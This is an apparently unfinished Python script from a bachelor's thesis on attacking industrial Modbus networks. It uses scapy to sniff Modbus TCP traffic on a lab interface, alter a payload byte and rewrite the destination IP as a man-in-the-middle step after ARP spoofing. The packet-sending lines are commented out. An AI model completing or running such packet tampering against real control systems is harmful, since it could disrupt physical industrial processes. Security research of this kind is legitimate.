# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: mima.py
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: 

from scapy.all import *



# we will need to arpspoof first 
# maybe Arpspoof tool which is aviable for linux


# Define the network interfaces to listen on and forward packets to
listen_interface = "eno2"
forward_interface = "eth1"

#
real_master_ip = '192.168.88.250' # 1C:69:7A:08:86:1A
MIM_ip         = '192.168.88.199' # 8c:04:ba:08:73:03



# Define the function that will be called for each received packet
def handle_packet(packet):
    
    # filter only modbus packet (tcp && (dst.port == 502 || src.port == 502 ))
    if not (packet.haslayer(TCP) and (packet[TCP].sport == 502 or packet[TCP].dport == 502)):
        return

    # master -> slave 
    if packet[IP].src == real_master_ip:
        print("$$$$$$$$$$$$$$$$$$$$")
        print(packet.display())
        app_layer = bytearray(packet[TCP].payload.load)
        print(app_layer)
        app_layer[0] = 0x41 # modify third byte 
        print(app_layer)
        print(packet)
        print("$$$$$$$$$$$$$$$$$$$$")
    #    print(ls(packet))
    # slave -> master 
    else:
        pass

    packet[IP].dst = "192.168.88.69"
    #sendp(packet, iface=listen_interface)

    
    # Modify the packet's source and destination MAC addresses to forward it to the other interface
    #packet.src, packet.dst = packet.dst, packet.src
    # Send the packet out the other interface
    #sendp(packet, iface=forward_interface)

# Start sniffing packets on the listen interface and call the handle_packet function for each packet received
sniff(iface=listen_interface, prn=handle_packet)



    